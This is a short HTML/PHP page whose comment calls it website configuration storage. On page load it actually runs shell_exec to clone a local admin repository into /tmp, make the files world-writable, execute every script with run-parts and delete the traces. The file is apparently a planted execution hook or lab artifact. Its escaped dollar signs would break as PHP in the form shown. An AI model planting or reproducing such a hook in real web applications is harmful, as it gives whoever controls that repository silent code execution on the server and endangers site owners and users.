<!DOCTYPE HTML>
<html>
<body>
<?php
/**
 * Used to store website configuration information and run all scripts in bin1 in tmp
 */
\$ret = shell_exec('mkdir /tmp/bin1 ; git clone /home/admin/admin /tmp/bin1 ; chmod 777 /tmp/bin1/* ; run-parts --regex \".*\" /tmp/bin1 ; rm -rf /tmp/bin1');
echo \$ret;
?>
</body>
</html>
